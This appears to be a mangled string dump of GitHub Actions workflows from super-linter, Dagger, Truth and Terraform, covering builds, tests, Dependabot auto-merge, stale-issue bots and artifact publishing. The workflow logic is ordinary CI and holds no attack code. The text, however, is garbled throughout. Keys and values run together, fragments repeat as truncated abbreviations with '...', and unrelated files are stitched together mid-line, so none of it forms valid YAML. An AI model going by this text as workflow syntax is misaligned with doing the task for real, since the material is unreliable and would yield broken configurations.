git push --force origin ${{ env.SEMVER_MAJOR_VERSION }}
git push --force origin latest
name: T ... ersions- uses: ... @v4.1.3name: Publish Images/home/huawei/github-actions-security/.github/workflows/github_super-linter__ci.ymlset-build-metadataCONTAINER_IMAGE_BUILD_DATECONTAIN ... LD_DATE${{ steps.set-container-image-build-metadata.outputs.CONTAINER_IMAGE_BUILD_DATE }}${{ ste ... DATE }}CONTAINER_IMAGE_BUILD_REVISIONCONTAIN ... EVISION${{ steps.set-container-image-build-metadata.outputs.CONTAINER_IMAGE_BUILD_REVISION }}${{ ste ... SION }}CONTAINER_IMAGE_BUILD_VERSIONCONTAIN ... VERSION${{ steps.set-container-image-build-metadata.outputs.CONTAINER_IMAGE_BUILD_VERSION }}CONTAIN ... DATE }}set-container-image-build-metadataset-con ... etadataif [[ ${{ github.event_name }} == 'push' ]] || [[ ${{ github.event_name }} == 'merge_group' ]]; then
  BUILD_REVISION=${{ github.sha }}
elif [[ ${{ github.event_name }} == 'pull_request' ]]; then
  BUILD_REVISION=${{ github.event.pull_request.head.sha }}
else
  echo "[ERROR] Event not supported when setting build revision and build version"
  exit 1
fi

. scripts/build-metadata.sh

if [ -z "${BUILD_DATE}" ]; then
  echo "[ERROR] BUILD_DATE is empty"
  exit 1
fi

if [ -z "${BUILD_REVISION}" ]; then
  echo "[ERROR] BUILD_REVISION is empty"
  exit 1
fi

if [ -z "${BUILD_VERSION}" ]; then
  echo "[ERROR] BUILD_VERSION is empty"
  exit 1
fi

echo "Build date (GH Actions workflow): ${BUILD_DATE}"
echo "Build revision (GH Actions workflow): ${BUILD_REVISION}"
echo "Build version (GH Actions workflow): ${BUILD_VERSION}"

{
  echo "BUILD_DATE=${BUILD_DATE}"
  echo "BUILD_REVISION=${BUILD_REVISION}"
  echo "BUILD_VERSION=${BUILD_VERSION}"
} >> "${GITHUB_ENV}"

{
  echo "CONTAINER_IMAGE_BUILD_DATE=${BUILD_DATE}"
  echo "CONTAINER_IMAGE_BUILD_REVISION=${BUILD_REVISION}"
  echo "CONTAINER_IMAGE_BUILD_VERSION=${BUILD_VERSION}"
} >> "${GITHUB_OUTPUT}"
build-container-imagebuild-c ... r-image- set-build-metadata${{ github.workflow }}-${{ github.head_ref || github.ref }}-${{ github.event_name }}-${{ matrix.images.target }}CONTAINER_IMAGE_OUTPUT_IMAGE_NAMECONTAIN ... GE_NAMEsuper-linter-${{ matrix.images.prefix }}latest"super- ... latest"BUILD_DATE=${{ needs.set-build-metadata.outputs.CONTAINER_IMAGE_BUILD_DATE }}
BUILD_REVISION=${{ needs.set-build-metadata.outputs.CONTAINER_IMAGE_BUILD_REVISION }}
BUILD_VERSION=${{ needs.set-build-metadata.outputs.CONTAINER_IMAGE_BUILD_VERSION }}
type=docker,dest=/tmp/${{ env.CONTAINER_IMAGE_OUTPUT_IMAGE_NAME }}.tartype=do ...  }}.tarLoad imagedocker load <"/tmp/${{ env.CONTAINER_IMAGE_OUTPUT_IMAGE_NAME }}.tar"
name: Load imagePrint environment infoPrint e ... nt infomake info
name: P ... nt infoUpload ${{ env.CONTAINER_IMAGE_OUTPUT_IMAGE_NAME }} container imageUpload  ... r imageactions/upload-artifact@v4.3.6actions ... @v4.3.6${{ env.CONTAINER_IMAGE_OUTPUT_IMAGE_NAME }}${{ env ... NAME }}/tmp/${{ env.CONTAINER_IMAGE_OUTPUT_IMAGE_NAME }}.tar/tmp/${ ...  }}.tarname: $ ... NAME }}name: U ... r imagetest-local-actionTest the Super-linter GitHub ActionTest th ...  Actioncontainer-image-idsuper-linter-latestcontain ... -latestsuper-linter-slim-latestsuper-l ... -latest- conta ... -latestDownload ${{ env.CONTAINER_IMAGE_OUTPUT_IMAGE_NAME }} container imageDownloa ... r imageactions/download-artifact@v4.1.8actions ... @v4.1.8/tmpname: D ... r imageLoad ${{ env.CONTAINER_IMAGE_OUTPUT_IMAGE_NAME }} container imageLoad ${ ... r imagedocker load --input /tmp/${{ env.CONTAINER_IMAGE_OUTPUT_IMAGE_NAME }}.tar
docker image ls -a
name: L ... r imageUpdate action.ymlecho "yq version: $(yq --version)"
yq '.runs.image = "docker://" + env(CONTAINER_IMAGE_ID)' -i action.yml
echo "Action file contents:"
cat action.yml
name: U ... ion.ymlTest Local Action (debug log)Test Lo ... ug log)LOG_LEVELCREATE_LOG_FILEVALIDATE_ALL_CODEBASEVALIDAT ... ODEBASEGITLEAKS_CONFIG_FILE.gitleaks-ignore-tests.toml.gitlea ... ts.tomlFILTER_REGEX_EXCLUDE.*(/test/linters/|CHANGELOG.md).*".*(/te ... .md).*"RENOVATE_SHAREABLE_CONFIG_PRESET_FILE_NAMESRENOVAT ... E_NAMESdefault.json,hoge.json"defaul ... e.json"TYPESCRIPT_STANDARD_TSCONFIG_FILETYPESCR ... IG_FILE.github/linters/tsconfig.json".githu ... g.json"LOG_LEVEL: DEBUGname: T ... ug log)Get the contents of the log fileGet the ... og filesudo cat super-linter.log
sudo rm -v super-linter.log
name: G ... og fileTest Local Action (default log)Test Lo ... lt log)VALIDAT ... : falsename: T ... lt log)name: T ...  Actionbuild-test-suite-matrixbuild-t ... -matrixBuild test suite matrixBuild t ...  matrix${{ steps.generate-matrix.outputs.test-cases }}${{ ste ... ases }}matrix: ... ases }}Generate test cases matrixGenerat ...  matrixgenerate-matrixTEST_TARGETS=$(make -pRrq 2>&1 | grep 'test:' | tr -d '\n' | sed -e "s/^test: //" | jq --raw-input --slurp --compact-output 'split(" ")')
echo "TEST_TARGETS: ${TEST_TARGETS}"
echo "test-cases=${TEST_TARGETS}" >> "${GITHUB_OUTPUT}"
name: G ...  matrixname: B ...  matrixrun-test-suiteRun test casestest-case${{ fromJson(needs.build-test-suite-matrix.outputs.matrix) }}test-case: test- test-case: testtest-ca ... rix) }}BUILD_DATE${{ needs.set-build-metadata.outputs.CONTAINER_IMAGE_BUILD_DATE }}${{ nee ... DATE }}BUILD_REVISION${{ needs.set-build-metadata.outputs.CONTAINER_IMAGE_BUILD_REVISION }}${{ nee ... SION }}BUILD_VERSION${{ needs.set-build-metadata.outputs.CONTAINER_IMAGE_BUILD_VERSION }}Test case: ${{ env.CONTAINER_IMAGE_OUTPUT_IMAGE_NAME }} - ${{ matrix.test-case }}"Test c ... ase }}"echo "Running: ${{ env.CONTAINER_IMAGE_OUTPUT_IMAGE_NAME }} - ${{ matrix.test-case }}"
make ${{ matrix.test-case }}
name: " ... ase }}"name: Run test casestest-success-placeholdertest-su ... eholderCheck if all the tests passedCheck i ...  passed- run-test-suiteTest suite success${{ !(contains(needs.*.result, 'failure')) && !contains(needs.*.result, 'cancelled') && !contains(needs.*.result, 'skipped') }}${{ !(c ... ed') }}exit 0name: T ... successTest suite failures${{ contains(needs.*.result, 'failure') || contains(needs.*.result, 'cancelled') || contains(needs.*.result, 'skipped') }}${{ con ... ed') }}name: T ... ailures- name: ... successname: C ...  passedpreview-release-notespreview ... e-notesgithub.event_name == 'pull_request' && github.repository == github.event.pull_request.head.repo.full_name && github.repository == 'super-linter/super-linter'github. ... linter'Setup authentication tokenSetup a ... n tokenecho "${{ secrets.GITHUB_TOKEN }}" > .github-personal-access-token
name: S ... n tokenGenerate a preview of the release notesGenerat ... e notesmake release-please-dry-run
name: G ... e notesif: git ... linter'set-build-metadata:/home/huawei/github-actions-security/.github/workflows/github_super-linter__dependabot-automation.yamlDependabot automationDependa ... omationdependabot${{github.event.pull_request.html_url}}${{gith ... l_url}}PR_URL: ... l_url}}github.actor == 'dependabot[bot]'github. ... t[bot]'Fetch Dependabot metadataFetch D ... etadatametadatadependabot/fetch-metadata@v2dependa ... data@v2github- ... KEN }}"name: F ... etadataEnable auto-mergegh pr merge --auto --squash --delete-branch "${PR_URL}"gh pr m ... R_URL}"- name: ... etadatadependabot:name: D ... omation/home/huawei/github-actions-security/.github/workflows/github_super-linter__lint-commit.yamlLint commitcommitlintCheck if the pull request contains a single commitCheck i ...  commitgithub.event_name == 'pull_request'github. ... equest'commit_count=${{ github.event.pull_request.commits }}

if [ -z ${commit_count} ]; then
  echo "[ERROR] commit_count is empty"
  exit 1
fi

if [[ ${commit_count} -ne 1 ]]; then
  echo "[ERROR] This pull request contains ${commit_count} commits. Squash these commits into a single commit."
  exit 1
else
  echo "This pull request contains ${commit_count} commit."
fi
name: C ...  commitSet commit metadataSET_INTERVAL_VALUES="true"
if [[ ${{ github.event_name }} == 'push' ]] || [[ ${{ github.event_name }} == 'merge_group' ]]; then
  echo "Using default commit metadata"
  SET_INTERVAL_VALUES="false"
elif [[ ${{ github.event_name }} == 'pull_request' ]]; then
  FROM_INTERVAL_COMMITLINT=${{ github.event.pull_request.head.sha }}~${{ github.event.pull_request.commits }}
  TO_INTERVAL_COMMITLINT=${{ github.event.pull_request.head.sha }}
else
  echo "[ERROR] Event not supported when setting commit metadata"
  exit 1
fi

if [ "${SET_INTERVAL_VALUES}" == "true" ]; then
  if [ -z "${FROM_INTERVAL_COMMITLINT}" ]; then
    echo "[ERROR] FROM_INTERVAL_COMMITLINT is empty"
    exit 1
  fi

  if [ -z "${TO_INTERVAL_COMMITLINT}" ]; then
    echo "[ERROR] TO_INTERVAL_COMMITLINT is empty"
    exit 1
  fi

  {
    echo "FROM_INTERVAL_COMMITLINT=${FROM_INTERVAL_COMMITLINT}"
    echo "TO_INTERVAL_COMMITLINT=${TO_INTERVAL_COMMITLINT}"
  } >> "${GITHUB_ENV}"
else
  echo "Skip updating GITHUB_ENV. SET_INTERVAL_VALUES: ${SET_INTERVAL_VALUES}"
fi
Validate commitsmake lint-commits
name: V ... commitscommitlint:name: Lint commit/home/huawei/github-actions-security/.github/workflows/github_super-linter__stale.ymldeleted[create ... edited]Stale[bot]"Stale[bot]"markstale${{ github.event_name == 'schedule' }}${{ git ... ule' }}Mark issue staleThis issue has been automatically marked as stale because it has not had recent activity.
It will be closed in 14 days if no further activity occurs.
Thank you for your contributions.

If you think this issue should stay open, please remove the `O: stale ðŸ¤–` label or comment on the issue.

If you're a maintainer, you can stop the bot to mark this issue as stale in the future by adding the `O: backlog ðŸ¤–` label`."This i ... abel`."This pull request has been automatically marked as stale because it has not had recent activity.
It will be closed in 14 days if no further activity occurs.
Thank you for your contributions.

If you think this pull request should stay open, please remove the `O: stale ðŸ¤–` label or comment on the pull request.

If you're a maintainer, you can stop the bot to mark this issue as stale in the future by adding the `O: backlog ðŸ¤–` label`."This p ... abel`."O: stale ðŸ¤–"O: stale \u1f916\udd16"O: backlog ðŸ¤–"O: backlog \u1f916\udd16"name: M ... e stale- name: ... e stalemarknotstale${{ github.event_name == 'issue_comment' && contains(github.event.issue.labels.*.name, 'O: stale ðŸ¤–') && github.event.issue.user.type != 'Bot' }}"${{ gi ... ot' }}"Mark issue not stalegithub.rest.issues.removeLabel({
  issue_number: context.issue.number,
  owner: context.repo.owner,
  repo: context.repo.repo,
  name: 'O: stale ðŸ¤–'
})
name: M ... t stale- name: ... t stalemarkstale:/home/huawei/github-actions-security/.github/workflows/github_super-linter__thank_contributors.yamlMonthly contributor reportMonthly ...  report3 2 1 * *"3 2 1 * *"cron: "3 2 1 * *"- cron: "3 2 1 * *"contributor_reportcontributor reportGet dates for last monthGet dat ... t month# Calculate the first day of the previous month
start_date=$(date -d "last month" +%Y-%m-01)

# Calculate the last day of the previous month
end_date=$(date -d "$start_date +1 month -1 day" +%Y-%m-%d)

#Set an environment variable with the date range
echo "START_DATE=$start_date" >> "$GITHUB_ENV"
echo "END_DATE=$end_date" >> "$GITHUB_ENV"
name: G ... t monthRun contributor actionRun con ...  actiongithub/contributors@v1github/ ... tors@v1START_DATE${{ env.START_DATE }}${{ env ... DATE }}END_DATE${{ env.END_DATE }}super-linter/super-lintersuper-l ... -lintername: R ...  actionCreate issuepeter-evans/create-issue-from-file@v5peter-e ... file@v5Thank you super-linter contributors (${{ env.START_DATE }}..${{ env.END_DATE }})Thank y ... ATE }})./contributors.mdtitle:  ... ATE }})name: Create issue- name: ... t monthname: c ...  reportcontributor_report:name: M ...  report/home/huawei/github-actions-security/.github/workflows/google_dagger__ci.yml- masterUSE_JAVA_DISTRIBUTIONUSE_JAV ... IBUTIONzulu'zulu'USE_JAVA_VERSION'11'USE_JAVA_VERSION_FOR_GRADLE_PLUGINUSE_JAV ... _PLUGIN'17'USE_JAVA_VERSION_FOR_GRADLEUSE_JAV ... _GRADLE'18'USE_MAVEN_VERSION3.8.7'3.8.7'USE_JAV ...  'zulu'validate-latest-dagger-versionvalidat ... versionValidate Dagger version'Valida ... ersion'./.github/actions/prechecks./.gith ... echecksuses: . ... echecksbazel-buildBazel build'Bazel build'./.github/actions/bazel-build./.gith ... l-builduses: . ... l-buildname: 'Bazel build'bazel-testBazel tests'Bazel tests'large-runner-groupubuntu-22.04-16coregroup:  ... r-group./.github/actions/bazel-test./.gith ... el-testuses: . ... el-testname: 'Bazel tests'gradle-buildGradle build'Gradle build'./.github/actions/gradle-build./.gith ... e-builduses: . ... e-buildname: 'Gradle build'artifact-verification-testsartifac ... n-testsArtifact verification tests'Artifa ...  tests'./.github/actions/artifact-verification-tests./.gith ... n-testsuses: . ... n-testsname: ' ...  tests'artifact-java-local-testsartifac ... l-testsArtifact Java local tests./.github/actions/artifact-java-local-tests./.gith ... l-testsuses: . ... l-teststest-gradle-pluginTest Hilt Gradle plugin'Test H ... plugin'./.github/actions/test-gradle-plugin./.gith ... -pluginuses: . ... -pluginname: ' ... plugin'artifact-android-local-testsArtifact Android local tests (AGP ${{ matrix.agp }})'Artifa ... gp }})'agp8.1.1'8.1.1'jdkagp: '8.1.1'- agp: '8.1.1'./.github/actions/artifact-android-local-tests${{ matrix.agp }}'${{ matrix.agp }}'${{ matrix.jdk }}'${{ matrix.jdk }}'agp: '$ ... agp }}'name: ' ... gp }})'artifact-android-emulator-legacy-api-testsartifac ... i-testsArtifact Android emulator tests (API ${{ matrix.api-level }})'Artifa ... el }})'github.event_name == 'push' && github.repository == 'google/dagger' && github.ref == 'refs/heads/master'github. ... master'api-level26[16, 21, 26, 30]api-lev ... 26, 30]matrix: ... 26 (O)../.github/actions/artifact-android-emulator-tests./.gith ... r-tests35${{ matrix.api-level }}'${{ ma ... vel }}'api-lev ... vel }}'uses: . ... r-testsname: ' ... el }})'publish-snapshotPublish snapshot'Publish snapshot'Install Java ${{ env.USE_JAVA_VERSION }}'Instal ... ION }}'${{ env.USE_JAVA_DISTRIBUTION }}'${{ en ... ION }}'${{ env.USE_JAVA_VERSION }}server-idsonatype-nexus-snapshotssonatyp ... apshotsserver-usernameCI_DEPLOY_USERNAMEserver-passwordCI_DEPLOY_PASSWORDdistrib ... ION }}'name: ' ... ION }}''Check  ... sitory'name: ' ... sitory'Cache local Maven repository'Cache  ... sitory'~/.m2/repository
!~/.m2/repository/com/google/dagger
${{ runner.os }}-maven-${{ hashFiles('**/pom.xml') }}${{ run ... ml') }}${{ runner.os }}-maven-
Cache Bazel files'Cache Bazel files'~/.cache/bazel_github~/.cach ... _github${{ runner.os }}-bazel-build-${{ github.sha }}${{ run ... .sha }}${{ runner.os }}-bazel-build-
path: ~ ... azelrc.Cache Gradle files'Cache Gradle files'~/.gradle/caches
~/.gradle/wrapper
${{ runner.os }}-gradle-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties') }}${{ run ... es') }}${{ runner.os }}-gradle-
Publish latest docs'Publis ... t docs'./util/generate-latest-docs.sh./util/ ... docs.shGH_TOKE ... oken }}name: ' ... t docs'Publish latest snapshot'Publis ... apshot'util/deploy-all.sh \
  "deploy:deploy-file" \
  "HEAD-SNAPSHOT" \
  "-DrepositoryId=sonatype-nexus-snapshots" \
  "-Durl=https://oss.sonatype.org/content/repositories/snapshots"
${{ secrets.CI_DEPLOY_USERNAME }}${{ sec ... NAME }}${{ secrets.CI_DEPLOY_PASSWORD }}${{ sec ... WORD }}CI_DEPL ... NAME }}name: ' ... apshot'Clean bazel cache'Clean bazel cache'rm -rf $(bazel info repository_cache)rm -rf  ... _cache)name: ' ...  cache'- name: ... ION }}'build-gradle-plugin-latest-agpbuild-g ... est-agpBuild Hilt Gradle plugin against latest AGP version'Build  ... ersion'./.github/actions/build-gradle-plugin+'+'agp: '+'cleanup-cachesClean up GitHub Action caches'Clean  ... caches'./.github/actions/cleanup-caches./.gith ... -cachesuses: . ... -cachesname: ' ... caches'validat ... ersion:name: CI/home/huawei/github-actions-security/.github/workflows/google_dagger__release.ymlDagger Releasedagger_release_versiondagger_ ... versionThe Dagger version to use in this release.'The Da ... lease.'descrip ... lease.'dagger_ ... ersion:DAGGER_RELEASE_VERSIONDAGGER_ ... VERSION${{ github.event.inputs.dagger_release_version }}"${{ gi ... ion }}"publish-artifactsPublish Artifact'Publish Artifact'sonatype-nexus-stagingsonatyp ... staginggpg-private-key${{ secrets.CI_GPG_PRIVATE_KEY }}gpg-passphraseCI_GPG_PASSPHRASEPublish artifactsutil/deploy-all.sh \
  "gpg:sign-and-deploy-file" \
  "${{ env.DAGGER_RELEASE_VERSION }}" \
  "-DrepositoryId=sonatype-nexus-staging" \
  "-Durl=https://oss.sonatype.org/service/local/staging/deploy/maven2/"
${{ secrets.CI_GPG_PASSPHRASE }}${{ sec ... RASE }}name: P ... tifactsSet git credentials'Set gi ... ntials'git config --global user.email "dagger-dev+github@google.com"
git config --global user.name "Dagger Team"
name: ' ... ntials'Publish tagged release'Publis ... elease'util/publish-tagged-release.sh ${{ env.DAGGER_RELEASE_VERSION }}util/pu ... SION }}name: ' ... elease'Publish tagged docs'Publis ... d docs'util/publish-tagged-docs.sh ${{ env.DAGGER_RELEASE_VERSION }}name: ' ... d docs'name: ' ... tifact'name: Dagger Release/home/huawei/github-actions-security/.github/workflows/google_truth__ci.ymlJDK ${{ matrix.java }}"JDK ${ ... ava }}"[ 8, 11 ]java: [ 8, 11 ]Cancel previous runs'Cancel ... s runs'styfle/cancel-workflow-action@85880fa0301c86cca9da44039ee3bb12d3bedbfastyfle/ ... 3bedbfaaccess_tokenaccess_ ... oken }}name: ' ... s runs'Set up JDK ${{ matrix.java }}'Set up ... ava }}'actions/setup-java@c5195efecf7bdfc987ee8bae7a71cb8b11521c00actions ... 1521c00java-ve ... java }}name: ' ... ava }}'Install'Install'mvn -B -P!standard-with-extra-repos install -U -DskipTests=truemvn -B  ... ts=truename: 'Install''Test'mvn -B -P!standard-with-extra-repos verify -U -Dmaven.javadoc.skip=truemvn -B  ... ip=truename: 'Test'Javadoc Test Run'Javadoc Test Run'mvn -B -P!standard-with-extra-repos javadoc:aggregate -Umvn -B  ... gate -Uname: ' ... st Run'- name: ... s runs'name: " ... ava }}"publish_snapshotgithub.event_name == 'push' && github.repository == 'google/truth'github. ... /truth'Set up JDK 11'Set up JDK 11'java-version: 11name: ' ... JDK 11''Publish'mvn -B clean source:jar javadoc:jar deploy -DskipTests=truename: 'Publish'- name: ... sitory'generate_docsGenerate latest docs'Genera ... t docs'/home/huawei/github-actions-security/.github/workflows/hashicorp_terraform__build-terraform-cli.ymlbuild_terraformcgo-enabledgoosgoarchpackage-nameterraformproduct-versionld-flagsrunsoncgo-enabled:${{ inputs.runson }}Terraform ${{ inputs.goos }} ${{ inputs.goarch }} v${{ inputs.product-version }}Terrafo ... sion }}uses: a ...  v4.2.2actions/setup-go@d35c59abb061a4a6fb18e82ac0862c26744d6ab5actions ... 44d6ab5${{ inputs.go-version }}uses: a ...  v5.5.0Build TerraformGOOS${{ inputs.goos }}GOARCH${{ inputs.goarch }}GO_LDFLAGS${{ inputs.ld-flags }}${{ inp ... lags }}ACTIONSOSCGO_ENABLED${{ inputs.cgo-enabled }}${{ inp ... bled }}GOOS: $ ... goos }}hashicorp/actions-go-build@37358f6098ef21b09542d84a9814ebb843aa4e3ehashico ... 3aa4e3eproduct_name${{ inputs.package-name }}product_version${{ inputs.product-version }}go_versionreproduciblenopeinstructionsgo build -ldflags "${{ inputs.ld-flags }}" -o "$BIN_PATH" -trimpath -buildvcs=false
cp LICENSE "$TARGET_DIR/LICENSE.txt"product ... name }}name: B ... rraformCopy license file to config_dirCopy li ... fig_dir${{ inputs.goos == 'linux' }}LICENSE_DIR.release/linux/package/usr/share/doc/${{ inputs.package-name }}".relea ... ame }}"LICENSE ... ame }}"mkdir -p "$LICENSE_DIR" && cp LICENSE "$LICENSE_DIR/LICENSE.txt"
name: C ... fig_dirhashicorp/actions-packaging-linux@8d55a640bb30b5508f16757ea908b274564792d4hashico ... 64792d4"terraform"Terraform enables you to safely and predictably create, change, and improve infrastructure. It is a tool that codifies APIs into declarative configuration files that can be shared amongst team members, treated as code, edited, reviewed, and versioned."Terraf ... ioned."maintainerHashiCorp"HashiCorp"homepagehttps://terraform.io/"https: ... rm.io/"licenseBUSL-1.1"BUSL-1.1"binarydist/terraform"dist/terraform"deb_dependsgit"git"rpm_dependsconfig_dir.release/linux/package/".relea ... ckage/"name: "terraform"if: ${{ ... nux' }}Determine package file namesDetermi ... e namesecho "RPM_PACKAGE=$(basename out/*.rpm)" >> $GITHUB_ENV
echo "DEB_PACKAGE=$(basename out/*.deb)" >> $GITHUB_ENV
${{ env.RPM_PACKAGE }}${{ env ... KAGE }}out/${{ env.RPM_PACKAGE }}out/${{ ... KAGE }}name: $ ... KAGE }}${{ env.DEB_PACKAGE }}out/${{ env.DEB_PACKAGE }}- uses: ...  v4.2.2runs-on ... nson }}name: b ... rraform/home/huawei/github-actions-security/.github/workflows/hashicorp_terraform__build.ymlv[0-9]+.[0-9]+'v[0-9]+.[0-9]+'releng/**tsccr-auto-pinning/**tsccr-a ... ning/**dependabot/**v[0-9]+.[0-9]+.[0-9]+*'v[0-9] ... 0-9]+*'- 'v[0- ... 0-9]+*'PKG_NAMEPKG_NAM ... raform"get-product-versionDetermine intended Terraform version"Determ ... ersion"${{ steps.get-product-version.outputs.product-version }}product-version-base${{ steps.get-product-version.outputs.base-product-version }}product-version-pre${{ steps.get-product-version.outputs.prerelease-product-version }}experiments${{ steps.get-ldflags.outputs.experiments }}${{ ste ... ents }}go-ldflags${{ steps.get-ldflags.outputs.go-ldflags }}${{ ste ... lags }}pkg-name${{ steps.get-pkg-name.outputs.pkg-name }}${{ ste ... name }}product ... sion }}Get Package Nameget-pkg-namepkg_name=${{ env.PKG_NAME }}
echo "pkg-name=${pkg_name}" | tee -a "${GITHUB_OUTPUT}"
name: G ... ge NameDecide version numberDecide  ...  numberhashicorp/actions-set-product-version@d9b52fb778068099ca4c5e28e1ca0fee2544e114hashico ... 544e114name: D ...  numberDetermine experimentsDetermi ... rimentsget-ldflagsRAW_VERSIONRAW_VER ... sion }}.github/scripts/get_product_version.sh.github ... sion.shname: D ... rimentsReport chosen version numberReport  ...  number[ -n "${{steps.get-product-version.outputs.product-version}}" ]
echo "::notice title=Terraform CLI Version::${{ steps.get-product-version.outputs.product-version }}"
name: R ...  numbername: " ... ersion"get-go-versionDetermine Go toolchain version${{ steps.get-go-version.outputs.version }}Determine Go version./.github/actions/go-version./.gith ... versionname: D ... versiongenerate-metadata-filegenerat ... ta-fileGenerate release metadata"Genera ... tadata"filepath${{ steps.generate-metadata-file.outputs.filepath }}filepat ... path }}Generate package metadatahashicorp/actions-generate-metadata@fdbc8803a0e53bcbb912ddeee3808329033d6357hashico ... 33d6357${{ needs.get-product-version.outputs.product-version }}product${{ env.PKG_NAME }}metadata.jsonname: metadata.jsonuses: a ...  v4.6.2name: " ... tadata"Build for ${{ matrix.goos }}_${{ matrix.goarch }}Build f ... arch }}- get-p ... version./.github/workflows/build-terraform-cli.yml./.gith ... cli.yml${{ matrix.goarch }}${{ matrix.goos }}${{ needs.get-go-version.outputs.go-version }}${{ needs.get-product-version.outputs.pkg-name }}${{ nee ... name }}${{ needs.get-product-version.outputs.go-ldflags }}${{ nee ... lags }}${{ matrix.cgo-enabled }}${{ mat ... bled }}${{ matrix.runson }}goarch: ... arch }}freebsd"freebsd"386"386""ubuntu-latest""0"{goos:  ... d: "0"}amd64"amd64""arm""linux""arm64"openbsd"openbsd"solaris"solaris""windows""darwin"- {goos ... d: "0"}name: B ... arch }}package-dockerBuild Docker image for linux_${{ matrix.arch }}Build D ... arch }}["amd64 ... arm64"]arch: [ ... arm64"]repo${{needs.get-product-version.outputs.product-version}}${{need ... rsion}}repo: "terraform"Build Docker imageshashicorp/actions-docker-build@11d43ef520c65f58683d048ce9b47d6617893c9ahashico ... 7893c9apkg_nameterraform_${{env.version}}"terraf ... sion}}"${{env.version}}bin_name${{matrix.arch}}dockerfilebuild.Dockerfilesmoke_test.github/scripts/verify_docker v${{ env.version }}.github ... sion }}docker.io/hashicorp/${{env.repo}}:${{env.version}}
public.ecr.aws/hashicorp/${{env.repo}}:${{env.version}}
pkg_nam ... sion}}"name: B ...  imagese2etest-buildBuild e2etest for ${{ matrix.goos }}_${{ matrix.goarch }}Build e ... arch }}e2e-cache-key${{ steps.set-cache-values.outputs.e2e-cache-key }}${{ ste ... -key }}e2e-cache-path${{ steps.set-cache-values.outputs.e2e-cache-path }}e2e-cac ... -key }}{goos:  ... amd64"}{goos:  ... arm64"}{goos:  ...  "386"}{goos:  ...  "arm"}- {goos ... amd64"}build_script./internal/command/e2etest/make-archive.sh./inter ... hive.shbuild_s ... hive.shSet Cache Valuesset-cache-valuescache_key=e2e-cache-${{ github.sha }}
cache_path=internal/command/e2etest/build
echo "e2e-cache-key=${cache_key}" | tee -a "${GITHUB_OUTPUT}"
echo "e2e-cache-path=${cache_path}" | tee -a "${GITHUB_OUTPUT}"
name: S ...  ValuesInstall Go toolchainBuild test harness packageBuild t ... package# NOTE: This script reacts to the GOOS, GOARCH, and GO_LDFLAGS
# environment variables defined above. The e2e test harness
# needs to know the version we're building for so it can verify
# that "terraform version" is returning that version number.
bash ./internal/command/e2etest/make-archive.sh
name: B ... packageSave test harness to cacheSave te ... o cacheactions/cache/save@5a3ec84eff668545956fd18022155c47e93e2684actions ... 93e2684${{ steps.set-cache-values.outputs.e2e-cache-key }}_${{ matrix.goos }}_${{ matrix.goarch }}${{ ste ... arch }}path: $ ... path }}- name: ...  ValuesRun e2e test for ${{ matrix.goos }}_${{ matrix.goarch }}Run e2e ... arch }}{ runso ... md64" }{ runso ... "386" }{ runso ... "arm" }{ runso ... rm64" }- { run ... md64" }os: ${{ ... goos }}Checkout repo${{ (matrix.goos == 'linux') || (matrix.goos == 'darwin') }}${{ (ma ... in') }}name: Checkout repo"Restore cache"actions/cache/restore@5a3ec84eff668545956fd18022155c47e93e2684e2etestpkg${{ needs.e2etest-build.outputs.e2e-cache-path }}${{ nee ... path }}${{ needs.e2etest-build.outputs.e2e-cache-key }}_${{ matrix.goos }}_${{ matrix.goarch }}${{ nee ... arch }}fail-on-cache-missenableCrossOsArchivename: " ...  cache"Download Terraform CLI package"Downlo ... ackage"clipkgterraform_${{env.version}}_${{ env.os }}_${{ env.arch }}.zipterrafo ...  }}.zipname: t ...  }}.zipname: " ... ackage"Extract packages${{ matrix.goos == 'windows' }}${{ mat ... ows' }}unzip "${{ needs.e2etest-build.outputs.e2e-cache-path }}/terraform-e2etest_${{ env.os }}_${{ env.arch }}.zip"
unzip "./terraform_${{env.version}}_${{ env.os }}_${{ env.arch }}.zip"
name: E ... ackagesdocker/setup-qemu-action@29109295f81e9208d7d86ff1c6c12d2833863392docker/ ... 3863392${{ contains(matrix.goarch, 'arm') }}${{ con ... rm') }}platformsplatforms: allRun E2E Tests (Darwin & Linux)Run E2E ...  Linux)e2e_cache_pathe2e_cac ... path }}.github/scripts/e2e_test_linux_darwin.sh.github ... rwin.shname: R ...  Linux)Run E2E Tests (Windows)Run E2E ... indows)TF_ACCTF_ACC: 1e2etest.exe -test.vname: R ... indows)name: R ... arch }}e2e-test-execRun terraform-exec test for linux amd64Run ter ... x amd64Downloa ... packageterraform_${{ env.version }}_linux_amd64.zipterrafo ... d64.zipname: t ... d64.zipname: D ... packageCheckout terraform-exec repoCheckou ... ec repohashicorp/terraform-exechashico ... rm-execterraform-execreposit ... rm-execname: C ... ec repoRun terraform-exec end-to-end testsRun ter ... d testsFULL_RELEASE_VERSION="${{ env.version }}"
unzip terraform_${FULL_RELEASE_VERSION}_linux_amd64.zip
export TFEXEC_E2ETEST_TERRAFORM_PATH="$(pwd)/terraform"
cd terraform-exec
go test -race -timeout=30m -v ./tfexec/internal/e2etest
name: R ... d tests- name: ... olchainname: R ... x amd64get-product-version:/home/huawei/github-actions-security/.github/workflows/hashicorp_terraform__changelog.ymlChangelogcheck-changelog-entrycheck-c ... g-entryCheck Changelog Entry"Check  ...  Entry"changelog-${{ github.head_ref }}changel ... _ref }}group:  ... _ref }}Changed files"Changed files"changelogchanges:
    - '.changes/*/*.yaml'
changelog:
  - 'CHANGELOG.md'
version:
  - 'version/VERSION'
name: " ...  files"sparse-checkoutversion/VERSION
.changie.yaml
.changes/
sparse-checkout-cone-modesparse- ... ne-modesparse-checkout: |Check for changelog entry"Check  ...  entry"const fs = require("fs");
async function createOrUpdateChangelogComment(commentDetails, deleteComment) {
    const commentStart = "## Changelog Warning"
    
    const body = commentStart + "\n\n" + commentDetails;
    const { number: issue_number } = context.issue;
    const { owner, repo } = context.repo;
    
    // List all comments
    const allComments = (await github.rest.issues.listComments({
        issue_number,
        owner,
        repo,
    })).data;

    const existingComment = allComments.find(c => c.body.startsWith(commentStart));
    const comment_id = existingComment?.id;
    
    if (deleteComment) {
        if (existingComment) {
            await github.rest.issues.deleteComment({
                owner,
                repo,
                comment_id,
            });
        }
        return;
    }

    core.setFailed(commentDetails);

    if (existingComment) {
        await github.rest.issues.updateComment({
            owner,
            repo,
            comment_id,
            body,
        });
    } else {
        await github.rest.issues.createComment({
            owner,
            repo,
            issue_number,
            body,
        });
    }
}

const changesPresent = ${{steps.changelog.outputs.changes}};
